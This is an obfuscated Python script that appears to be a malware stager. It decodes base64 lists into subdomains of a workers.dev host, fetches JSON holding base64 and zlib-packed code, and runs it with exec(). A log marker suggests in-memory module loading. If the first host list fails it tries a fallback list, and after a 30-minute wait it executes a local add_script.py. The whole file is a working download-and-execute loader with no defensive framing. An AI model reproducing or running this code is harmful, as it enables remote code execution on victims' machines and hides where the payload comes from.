import base64 as _b64
import zlib as _zl
import sys as _sy
import os as _os
import threading as _th
import time as _tm
import urllib.request as _ur
import json as _js

try:
    from base64 import b64decode as _bd
    from zlib import decompress as _dc
    import sys, os, threading, time, urllib.request, json
    print("Vse moduly uspeshno importirovany.")
except ImportError as _e:
    print(f"Oshibka importa modulya: {_e}")
    _sy.exit(1)

_x1 = _sy.stdout
_x2 = _sy.stderr

_p1 = _os.path.join(_os.getcwd(), 'out1.log')
_p2 = _os.path.join(_os.getcwd(), 'out2.log')
_p3 = _os.path.join(_os.getcwd(), 'add_out.log')

_n1 = 'add_script.py'
_f1 = '+'
_sp = _os.path.join(_os.getcwd(), _n1)

for _lp in [_p1, _p2, _p3]:
    if _os.path.exists(_lp):
        try:
            _os.remove(_lp)
            print(f"Fayl {_lp} udalen.")
        except Exception as _e:
            print(f"Oshibka udaleniya fayla {_lp}: {_e}")

_s1 = False

_l1 = [
    "ABCDEb3BrZXJyaXJhMTk3Mg==", "FGHIJpcGJ1dm9sdGFpMTk3Mg==", 
    "KLMNOc2ltenFsdXBhbGkxOTc2", "PQRSTW1pemFsdXBhMTk5NDI=",
    "UVWXZd2F2ZXphbHVwYWRvbnMxOTg1Mw==", "YZABCc3BhcnphbHVwYW5zMjAwMTQ=",
    "DEFGHc2hhZHphbHVwYW5zMTI5MjU=", "IJKLMGdsemFsdXBhbnMxNTg5Ng==",
    "NOPQRZnJ6YWx1cGFuczE2OTg3", "STUVXbmVhZHphbHVwYXMxOTc1OA==",
    "WXYZA2R1c3phbHVwYW5zMjAzMjk=", "BCDEFc3R6YWx1cGFvbnMxOTIzMTA=",
    "GHIJKZW16YWx1cGFuczE5MTYxMQ==", "LMNOPbnphbHVwYWRvbnMxOTEy",
    "QRSTUbnpkYWx1cGFvbnMyMGQ=", "VWXYZGdob3N6YWx1cGFzMTE5Mjg=",
    "ABCDEcmFpemFsdXBhb25zMTkxMQ==", "FGHIJc3phbHVwYW9uczIwMTQ=",
    "KLMNOdm9pZHphbHVwYXMxOTI0", "PQRSTHRoemFsdXBhZGRvbnMxOTQ2",
    "UVWXZdWFsdXBhZXVzMTk3MA=="
]

_l2 = [
    "YZABCdGFyZXNvZGkxOTg2", "DEFGHc3RyZWFtemFsdXBhMTk3NA==",
    "IJKLMbGlnaHR6YWx1cGExOTg1", "NOPQRc2hhZG96YWx1cGExOTk2Mg==",
    "STUVXc3Rvcm16YWx1cGEyMDA0Nw==", "WXYZA2VtYmVyemFsdXBhMTI5Mzg=",
    "BCDEFZnJvc3R6YWx1cGE1ODc5", "GHIJKnplb256YWx1cGExNjk1OA==",
    "LMNOPZHVsY2hhcnphbHVwYTE5NzQ5", "QRSTUc3BhemFsdXBhMjAzMTA=",
    "VWXYZndhemFsdXBhMTkyNDEx", "ABCDEbml6YWx1cGExOTEzMg==",
    "FGHIJYmxfemFsdXBhMjAxNGQ=", "KLMNOZ2hvemFsdXBhZ2UxMTkyNQ==",
    "PQRSTcmFpemFsdXBhaW5rMTkxNg==", "UVWXZc3phbHVwYWUyMDI0Nw==",
    "YZABCdm96YWx1cGFpbmsxOTI4", "DEFGHdGh6YWx1cGFyZm9yZTE5NDU=",
    "IJKLMWF6YWx1cGFsaW5rMTk3MDk=", "NOPQRbXphbHVwYXJnZTE5ODc2",
    "STUVX2d6YWx1cGFsaW5rMjAwMTU="
]

def _d1(_x):
    try:
        if len(_x) < 6:
            return None
        _r = _bd(_x[5:].encode()).decode()
        return _r
    except Exception as _e:
        print(f"Err decode {_x}: {_e}")
        return None

_nms1 = [_d1(_n) for _n in _l1]
_nms1 = [_n for _n in _nms1 if _n]
_nms2 = [_d1(_n) for _n in _l2]
_nms2 = [_n for _n in _nms2 if _n]

def _f1(_u):
    print(f"Zapr k {_u}...")
    try:
        _r = _ur.Request(_u, headers={'User-Agent': 'Mozilla/5.0'})
        _tm.sleep(1)
        with _ur.urlopen(_r, timeout=15) as _rp:
            _st = _rp.getcode()
            print(f"Status: {_st}")
            _dt = _rp.read().decode('utf-8')
            print(f"Raw: {_dt[:100]}...")
            try:
                _jd = _js.loads(_dt)
                print(f"JSON: {_jd}")
                if 'link' in _jd and _jd['link']:
                    if len(_jd['link']) > 5:
                        try:
                            _bd(_jd['link'][5:].encode())
                            return _jd['link']
                        except Exception as _e:
                            print(f"Invalid b64: {_e}")
                            return None
                    else:
                        print("Link korotkiy")
                        return None
                else:
                    print("No link")
                    return None
            except _js.JSONDecodeError as _e:
                print(f"JSON err: {_e}")
                return None
    except Exception as _e:
        print(f"Err fetch {_u}: {_e}")
        return None

def _m1(_t=100, _ts="[*] Loading in memory module package: pythonmemorymodule"):
    global _s1
    _st = _tm.time()
    while _tm.time() - _st < _t:
        try:
            if _os.path.exists(_p1):
                with open(_p1, 'r', encoding='utf-8') as _lf:
                    _c = _lf.read()
                    if _ts in _c:
                        _s1 = True
                        print("Target found. Script1 OK.")
                        return
        except Exception as _e:
            print(f"Log read err: {_e}")
        _tm.sleep(1)

def _e1(_es, _lp):
    try:
        if _es is None:
            raise ValueError("No script")
        print(f"Decode try: {_es[:50]}...")
        with open(_lp, 'a', encoding='utf-8') as _lf:
            _lf.write(f"Decode try: {_es[:50]}...\n")
        _cs = _es[5:]
        try:
            _ds = _dc(_bd(_cs.encode())).decode()
        except (_b64.binascii.Error, _zl.error) as _e:
            raise ValueError(f"Invalid b64/zlib: {_e}")
        with open(_lp, 'a', encoding='utf-8') as _lf:
            _sy.stdout = _lf
            _sy.stderr = _lf
            try:
                print(f"Exec script...")
                exec(_ds, globals())
            except Exception as _e:
                print(f"Exec err: {_e}", file=_lf)
        _sy.stdout = _x1
        _sy.stderr = _x2
    except Exception as _e:
        with open(_lp, 'a', encoding='utf-8') as _lf:
            _lf.write(f"Decode err: {_e}\n")
        print(f"Decode err: {_e}")

def _e2():
    try:
        if not _s1:
            print("Script1 failed. No add script.")
            return
        if _f1 != '+':
            print(f"Flag {_f1} != '+'. No script.")
            return
        if not _os.path.exists(_sp):
            print(f"No script {_sp}.")
            return
        print(f"Run add script {_sp}...")
        with open(_sp, 'r', encoding='utf-8') as _sf:
            _sc = _sf.read()
        with open(_p3, 'a', encoding='utf-8') as _lf:
            _sy.stdout = _lf
            _sy.stderr = _lf
            try:
                exec(_sc, globals())
            except Exception as _e:
                print(f"Add script err: {_e}", file=_lf)
        _sy.stdout = _x1
        _sy.stderr = _x2
        print("Add script done.")
    except Exception as _e:
        with open(_p3, 'a', encoding='utf-8') as _lf:
            _lf.write(f"Add script err: {_e}\n")
        print(f"Add script err: {_e}")

def _dms():
    _tm.sleep(2)
    _m1()

def _ka(_d=1800):
    _et = _tm.time() + _d
    while _tm.time() < _et:
        try:
            _tm.sleep(1)
        except Exception:
            pass

_pr = "zalypagylivera"
_wd = "workers.dev/get-link"
_mx = 3

_mt = _th.Thread(target=_dms)
_mt.daemon = False
_mt.start()

print("Load script1...")
_es1 = None
for _n in _nms1:
    _u = f"https://{_pr}.{_n}.{_wd}"
    print(f"Try load1 {_u}...")
    _a = 1
    while _a <= _mx:
        print(f"Attempt {_a}/{_mx} for {_u}")
        _es1 = _f1(_u)
        if _es1:
            break
        _a += 1
    if _es1:
        break

try:
    print("Run script1...")
    with open(_p1, 'a', encoding='utf-8') as _lf:
        _lf.write("Run script1...\n")
    _th.Thread(target=_e1, args=(_es1, _p1)).start()
except Exception as _e:
    with open(_p1, 'a', encoding='utf-8') as _lf:
        _lf.write(f"Run1 err: {_e}\n")
    print(f"Run1 err: {_e}")

_mt.join()

if not _s1:
    print("Script1 failed. Load alt...")
    _es2 = None
    for _n in _nms2:
        _u = f"https://{_pr}.{_n}.{_wd}"
        print(f"Try load2 {_u}...")
        _a = 1
        while _a <= _mx:
            print(f"Attempt {_a}/{_mx} for {_u}")
            _es2 = _f1(_u)
            if _es2:
                break
            _a += 1
        if _es2:
            break

    try:
        with open(_p2, 'a', encoding='utf-8') as _lf:
            _lf.write("Run script2...\n")
        _th.Thread(target=_e1, args=(_es2, _p2)).start()
    except Exception as _e:
        with open(_p2, 'a', encoding='utf-8') as _lf:
            _lf.write(f"Run2 err: {_e}\n")
        print(f"Run2 err: {_e}")
else:
    print("Script1 OK. No alt needed.")

print("Wait mode 30min...")

_kt = _th.Thread(target=_ka, args=(1800,))
_kt.daemon = False
_kt.start()

try:
    _tm.sleep(1800)
except KeyboardInterrupt:
    print("\nProgram stopped by user.")
finally:
    print("30min passed. Script done.")
    _e2()